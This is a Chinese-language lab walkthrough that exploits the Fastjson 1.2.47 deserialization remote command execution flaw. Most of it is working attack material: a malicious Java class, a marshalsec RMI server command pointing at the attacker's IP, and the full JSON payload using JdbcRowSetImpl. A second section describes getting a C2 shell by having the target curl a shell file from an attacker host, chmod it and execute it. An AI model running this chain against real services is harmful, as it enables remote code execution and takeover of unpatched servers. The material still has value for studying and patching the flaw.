# Fastjson 1.2.47 远程命令执行漏洞

## 漏洞复现

首先编译并上传命令执行代码

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

然后利用python起一个web服务

```
python3 -m http.server 80
```

然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击ip/#TouchFile" 9999
```

向靶场服务器发送Payload：

```
POST / HTTP/1.1
Host: ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 258

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://攻击ip:9999/Exploit",
        "autoCommit":true
    }
}
```

![image-20220315143642923](/Users/james/Library/Application Support/typora-user-images/image-20220315143642923.png)

这个时候去docker容器里面查看生成的情况，

![image-20220315143552658](/Users/james/Library/Application Support/typora-user-images/image-20220315143552658.png)

## 上线viper

既然我们可以命令执行了，如果是在渗透测试的话，就可以点到为止了。但是如果我们是在攻防演练中我们是要拿shell，然后打内网的。这样首先学习写一个命令执行的demo

```
package test.day11;

import java.io.*;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Demo01exec {

    public static void main(String[] args) {
        String s = null;
        try {
            String[] commands = {"curl", "-O","http://ip/flag"};
            Process p = Runtime.getRuntime().exec(commands);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            //从命令行打印出输出结果
            System.out.println("标准输出命令\n");
            while ((s = stdInput.readLine()) != null) {
                System.out.println(s);
            }

            System.out.println("标准错误的输出命令(如果存在):\n");
            while ((s = stdError.readLine()) != null) {
                System.out.println(s);
            }
            System.exit(0);
        } catch (IOException e) {
            System.out.println("异常发生: ");
            e.printStackTrace();
            System.exit(1);
        }
    }
}
```

![image-20220315144546257](/Users/james/Library/Application Support/typora-user-images/image-20220315144546257.png)

这样的demo实现后，直接就去实践了，还是编译之后上传

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

flag改成你的shell文件,这里要等一会

```
String[] commands = {"curl", "-O","http://ip/flag"};
```

给权限

```
String[] commands = {"chmod", "+x","flag"};
```

执行

```
String[] commands = {"./flag"};
```

成功上线

![image-20220315145532594](/Users/james/Library/Application Support/typora-user-images/image-20220315145532594.png)